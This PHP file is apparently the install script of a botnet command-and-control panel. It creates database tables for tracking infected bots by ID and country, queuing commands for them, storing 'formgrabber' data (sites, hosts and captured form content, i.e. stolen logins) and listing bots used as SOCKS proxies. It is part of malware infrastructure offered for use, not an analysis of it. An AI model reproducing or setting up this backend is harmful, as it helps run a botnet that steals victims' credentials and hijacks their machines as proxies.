<?php
///start php, get connection crap from config
include("./inc/config.php");
include("./inc/funcs.php");

//see if connection works, die if it doesnt
$link or die(mysql_error());
echo "Connection Feasible, Continuing...<br/>";

//select database 
mysql_select_db($mysql_db, $link);
echo "Selected Database".$mysql_db."<br/>";

//sql query needed for Bot Table
$query= "CREATE TABLE IF NOT EXISTS `lst_bots` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `UID` mediumtext CHARACTER SET ascii NOT NULL,
  `country` mediumtext CHARACTER SET ascii NOT NULL,
  `commands` mediumtext CHARACTER SET ascii NOT NULL,
  `version` mediumtext CHARACTER SET ascii COLLATE ascii_bin NOT NULL,
  `lasttime` int(11) NOT NULL,
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1;";
$res = mysql_query($query, $link) or die(mysql_error());			
	echo "Created Bot Table<br/>";

//SQL query for Commands Table
$query= "CREATE TABLE IF NOT EXISTS `lst_commands` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `command` mediumtext CHARACTER SET ascii NOT NULL,
  `parameters` longtext CHARACTER SET ascii NOT NULL,
  `max` int(11) NOT NULL,
  `done` int(11) NOT NULL,
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1;";
$res = mysql_query($query, $link) or die(mysql_error());			
	echo "Created Commands Table<br/>";

//SQL query for Countries Table
$query= "CREATE TABLE IF NOT EXISTS `lst_countries` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `countryname` mediumtext CHARACTER SET ascii NOT NULL,
  `countrycode` mediumtext CHARACTER SET ascii NOT NULL,
  `totalbots` int(11) NOT NULL,
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1;";
$res = mysql_query($query, $link) or die(mysql_error());			
	echo "Created Countries Table<br/>";	
	
//SQL Query for Formgrabber Table
$query= "CREATE TABLE IF NOT EXISTS `lst_formgrabber` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `site` text NOT NULL,
  `host` text NOT NULL,
  `content` text NOT NULL,
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1;";
$res = mysql_query($query, $link) or die(mysql_error());			
	echo "Created Formgrabber Table<br/>";	
//SQL Query for Socks Table
$query= "CREATE TABLE IF NOT EXISTS `lst_socks_bots` (
  `ID` int(11) NOT NULL AUTO_INCREMENT,
  `UID` mediumtext NOT NULL,
  `countrycode` mediumtext NOT NULL,
  `IP` mediumtext NOT NULL,
  `lasttime` int(11) NOT NULL,
  PRIMARY KEY (`ID`)
) ENGINE=MyISAM  DEFAULT CHARSET=latin1;";
$res = mysql_query($query, $link) or die(mysql_error());			
	echo "Created Socks Table<br/>";

echo "<centered><h1>Created Tables</h1></centered>";
echo "<centered><h1>Installation Finished</h1></centered>";

?>